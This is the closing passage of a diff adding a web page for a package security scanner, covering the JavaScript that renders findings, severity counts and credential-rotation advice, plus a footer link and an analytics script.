+  summary.innerHTML = "<b class='verd'>" + label + "</b> — " + total + " finding" + (total === 1 ? "" : "s") + " (Critical: " + r.counts.CRITICAL + " · High: " + r.counts.HIGH + " · Medium: " + r.counts.MEDIUM + ")<br><br>" + advice;
+  r.findings.forEach(function(f){
+    var d = document.createElement("div"); d.className = "finding";
+    d.innerHTML = "<div class='meta'><span class='sev " + f.severity + "'>" + f.severity + "</span>Line " + f.line + "</div><div class='rule'>" + esc(f.rule) + "</div><div class='expl'>" + esc(f.explanation) + "</div><div class='snip'>" + esc(f.snippet) + "</div>";
+    results.appendChild(d);
+  });
+  if (r.rotations.length){
+    rotBox.style.display = "block";
+    r.rotations.forEach(function(t){
+      var li = document.createElement("li"); li.textContent = t; rotList.appendChild(li);
+    });
+  }
+  summary.scrollIntoView({ behavior: "smooth", block: "center" });
+}
+document.getElementById("scanbtn").onclick = function(){ render(analyzePackageText(ta.value)); };
+document.getElementById("loadflagged").onclick = function(){ ta.value = SAMPLE_FLAGGED; render(analyzePackageText(ta.value)); };
+document.getElementById("loadclean").onclick = function(){ ta.value = SAMPLE_CLEAN; render(analyzePackageText(ta.value)); };
+document.getElementById("clearbtn").onclick = function(){ ta.value = ""; results.innerHTML = ""; rotList.innerHTML = ""; rotBox.style.display = "none"; summary.style.display = "none"; ta.focus(); };
+})();
+</script>
+<div id="ecosystem-footer"><a href="https://github.com/Iceman2050">GitHub: 73 open-source security tools by Ingenious AI</a></div>
+<script src="ecosystem.js"></script>
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "376c9de98060423683cfe15cec38f36b"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
